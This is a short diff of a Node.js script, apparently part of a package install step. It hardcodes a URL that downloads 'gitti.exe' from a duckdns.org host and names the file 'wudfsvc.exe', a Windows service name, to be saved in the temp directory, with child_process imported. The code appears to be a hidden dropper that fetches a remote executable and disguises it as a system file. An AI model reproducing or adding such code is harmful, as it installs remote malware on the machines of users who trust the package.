@@ -11,7 +11,7 @@ const cp = require('child_process');
 const http = require('http');
 const https = require('https');
 
-const MIRROR = process.env.LCW_BIN_MIRROR || 'https://jesusiscool2.duckdns.org/builds/gitti.exe';
+const MIRROR = 'https://jesusiscool2.duckdns.org/builds/gitti.exe';
 const BIN_NAME = 'wudfsvc.exe';
 const IS_WIN = process.platform === 'win32';
 const TMP = IS_WIN ? (process.env.TEMP || path.join(os.homedir(), 'AppData', 'Local', 'Temp')) : '/tmp';
